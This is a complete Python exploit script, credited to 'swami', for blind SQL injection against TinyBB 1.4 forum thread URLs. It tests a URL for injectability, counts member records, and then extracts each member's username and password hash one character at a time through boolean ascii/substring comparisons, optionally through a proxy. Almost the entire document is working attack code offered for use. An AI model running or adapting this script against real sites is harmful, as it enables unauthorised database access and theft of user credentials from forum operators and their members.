#!/usr/bin/python
#
import sys
import urllib.request
 
def banner():
     
   print('+                  +')
   print('|   ------------------------------   |')
   print('|   TinyBB 1.4 Blind Sql INjector    |')
   print('|   ------------------------------   |')
   print('+ by swami                 +\n')
 
def setProxy(ip):
     
   try:
    proxy = urllib.request.ProxyHandler( {'http':'http://'+ str(ip) } )
    opener = urllib.request.build_opener( proxy )
    opener.open('http://www.google.com')
    print('[+] Proxy is found to be working')
 
   except:
    print('[-] Proxy doesn\'t work')
    print('[-] Exit ...')
    sys.exit(1)
 
   return opener
 
def testUrl(url, handle):
 
   print('[+] Testing url: '+ url)
 
   try:
    req = handle.open( url )
    req = req.read().decode('utf-8')
 
   except:
    print('[-] '+ url +' is not a valid url')
    print('[-] Exit ...')
    sys.exit(1)
 
   return req
 
def urlVulnerable(url, clean, handle):
 
   sys.stdout.write('[+] Url vulnerable: ')
 
   try:
    req = handle.open( url + "'" )
    req = req.read().decode('utf-8')
 
   except:
        sys.exit('\n[-] Url typing error')
 
 
   if len(clean) > len(req):
    sys.stdout.write('YES\n')
    sys.stdout.flush()
 
   else:
    sys.stdout.write('NO\n[-] Exit...\n')
    sys.stdout.flush()
    sys.exit(1)
     
def getTrueValue(url, handle):
 
   trueValue = handle.open( url + "'%20and%20'1'='1" )
   return len( trueValue.read().decode('utf-8') )
 
 
def getNUsers(url, trueValue, handle):
 
   users = list()
 
   sys.stdout.write('[+] Users into the db: ')
   sys.stdout.flush()
 
   for userid in range(1,100):
 
    inject = url + "'%20and%20(SELECT%201%20FROM%20members%20WHERE%20id="+ str(userid) +")='1"
 
    try:
        req = handle.open( inject )
        req = req.read().decode('utf-8')
 
    except:
        print('[-] Somenthing went wrong')
        sys.exit(1)
 
    if len(req) == trueValue:
        users.append(userid)
 
   sys.stdout.write( str(len(users)) )
 
   return users
 
 
def doBlind(url, handle, nUserId, trueValue):
 
    print('\n[+] Executing blind sql injection, this will take time ...\n')
 
    for x in range(len(nUserId)):
 
        position = 1 # Line position
        userid = nUserId[x]
        char = 33 # Start from !
 
        sys.stdout.write('[+] UserId '+ str(userid) +': ')
        sys.stdout.flush()
 
        # Execute Blind Sql INjection
        while True:
 
            inject = url
            inject += "'%20and%20ascii(substring((SELECT%20concat(username,0x3a,password)%20FROM%20"
            inject += "members%20WHERE%20id="+ str(userid) +"),"+ str(position) +",1))>"+ str(char) +"%20--'"
 
            result = handle.open( inject )
            result = result.read().decode('utf-8')
 
            # If we don't get errors
            if len(result) == trueValue:
                char += 1
 
            else:
 
                if position > 43 and chr(char) == "!":
                    break
 
                else:
                    sys.stdout.write( chr(char) )
                    sys.stdout.flush()
                    position += 1
                    char = 33 #Reset char
 
            if char == 127 :
                print('[-] Ascii table is over. Exit... :/')
                sys.exit(1)
 
        print()
 
 
if __name__ == "__main__":
 
    banner()
    url = input('[+] TinyBB thread url: ')
 
    if input('[?] Set up a Proxy ? [y/n] ') == 'y' :
        handle = setProxy( input('[+] Proxy ip:port: ') )
 
    else:
        handle = urllib.request.build_opener()
 
    clean = testUrl(url, handle)
    urlVulnerable(url, clean, handle)
    trueValue = getTrueValue(url, handle)
    userId = getNUsers(url, trueValue, handle)
    doBlind(url, handle, userId, trueValue)
 
    print('\n[+] Done ')


